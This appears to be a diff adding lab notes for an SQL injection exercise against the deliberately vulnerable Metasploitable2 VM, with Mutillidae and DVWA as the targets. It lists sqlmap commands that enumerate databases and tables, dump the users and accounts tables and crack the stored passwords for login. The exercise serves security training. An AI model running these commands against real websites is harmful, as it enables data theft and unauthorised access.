@@ -1,0 +1,31 @@
+#run metasploitable2 and kali linux and check ip address of metasploitable2
+if config
+#type metasploitable2 ip address on the browser. make sure metasploitable2 network is bridged and matches subnet of kali linux.
+#select mutillidae
+#now select OWASP Top 10 -> A1 Injection -> SQLi - Extract Data -> User Info
+#enter name and password and click on view account button 
+#now copy the link of the login page and run SQLMap in kali
+#open kali linux terminal and type 
+sqlmap -h
+sqlmap -u 'copied link' --dbs --dump --batch
+sqlmap -u 'copied link' --dbs 
+#change dbname from metasploit
+sudo nano /var/www/mutillidae/config.inc
+#change dbname metasploit to owasp10
+#save the changes with ctrl+O and then exit
+#after making changes in metasploitable2 you should be able to fix the login page on website, which will show proper error message
+#now retry the command and test the issue that should be resolved
+sqlmap -u 'copied link' --dbs 
+sqlmap -u 'copied link' -D dvwa --tables
+sqlmap -u 'copied link' -D dvwa -T users --columns
+sqlmap -u 'copied link' -D dvwa -T users --dump
+#type 0 in next 2 steps and press enter
+#type y wherever required
+#passwords will be cracked once process is complete
+#enter the cracked username and password on DVWA website
+#test the same SQL Injection with mutillidae website
+sqlmap -u 'copied link' --dbs
+sqlmap -u 'copied link' -D owasp10 -T users --dump
+sqlmap -u 'copied link' -D owasp10 --tables
+#in next step type 0 and press enter
+sqlmap -u 'copied link' -D owasp10 -T accounts --dump
